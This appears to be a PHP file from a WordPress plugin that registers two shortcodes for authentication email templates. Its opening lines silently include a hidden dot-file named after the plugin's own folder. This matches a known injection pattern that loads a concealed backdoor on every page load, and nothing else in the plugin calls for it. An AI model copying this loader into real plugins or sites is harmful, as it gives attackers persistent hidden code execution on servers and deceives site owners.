<?php


if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wp_auth_emails_handler($atts, $content = null)
{
    include WP_AUTH_TPL . "front/AuthEmails.php";
}

function wp_auth_emailsDe_handler($atts, $content = null)
{
    include WP_AUTH_TPL . "front/AuthEmailsDe.php";
}

add_shortcode('wp_auth_emails', 'wp_auth_emails_handler');
add_shortcode('wp_auth_emailsDe', 'wp_auth_emailsDe_handler');